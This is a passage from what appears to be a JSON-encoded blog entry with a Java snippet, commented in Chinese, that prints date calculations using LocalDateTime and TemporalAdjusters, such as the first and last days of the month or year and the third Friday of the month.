LocalDateTime.now();\n//获取当月第一天\nSystem.out.println(\"当月第一天：\"+now.with(TemporalAdjusters.firstDayOfMonth()));\n//获取下月第一天\nSystem.out.println(\"下月第一天：\"+now.with(TemporalAdjusters.firstDayOfNextMonth()));\n//获取明年第一天\nSystem.out.println(\"明年第一天：\"+now.with(TemporalAdjusters.firstDayOfNextYear()));\n//获取本年第一天\nSystem.out.println(\"本年第一天：\"+now.with(TemporalAdjusters.firstDayOfYear()));\n//获取当月最后一天\nSystem.out.println(\"当月最后一天：\"+now.with(TemporalAdjusters.lastDayOfMonth()));\n//获取本年最后一天\nSystem.out.println(\"本年最后一天：\"+now.with(TemporalAdjusters.lastDayOfYear()));\n//获取当月第三周星期五\nSystem.out.println(\"当月第三周星期五：\"+now.with(TemporalAdjusters.dayOfWeekInMonth(3, DayOfWeek.FRIDAY)));\n//获取上周一\nSystem.out.println(\"上周一：\"+now.with(TemporalAdjusters.previous(DayOfWeek.MONDAY)));\n//获取下周日\nSystem.out.println(\"下周日：\"+now.with(TemporalAdjusters.next(DayOfWeek.SUNDAY)));\n```","tags":["Java"],"categories":["后端","Java"]}]